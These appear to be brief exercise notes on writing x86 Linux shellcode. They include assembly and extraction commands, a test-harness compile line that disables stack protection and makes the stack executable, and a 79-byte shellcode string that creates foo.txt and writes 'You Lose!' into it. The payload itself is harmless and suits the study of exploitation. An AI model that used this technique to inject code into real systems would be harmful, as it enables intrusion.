Commands:

Compile asm file:

nasm -f elf32 write.asm; ld -N -m elf_i386 -o write write.o; ./write

Get shellcode:
objdump -d ./write|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d'
'|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed
's/^/"/'|sed 's/$/"/g'

Compile testsc:

gcc -Wall -m32 -fno-stack-protector -zexecstack -O0 -o testsc testsc.c


Shellcode (79 bytes):

"\xeb\x30\x5e\x31\xc0\x88\x46\x07\x8d\x1e\xb1\x41\x66\xba\xb6\x01\xb0\x05\xcd\x80\x50\xeb\x28\x5e\x31\xc0\x88\x46\x09\x8d\x0e\x5b\x31\xd2\xb2\x09\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x31\xdb\xb0\x01\xcd\x80\xe8\xcb\xff\xff\xff\x66\x6f\x6f\x2e\x74\x78\x74\x41\xe8\xd3\xff\xff\xff\x59\x6f\x75\x20\x4c\x6f\x73\x65\x21\x41"


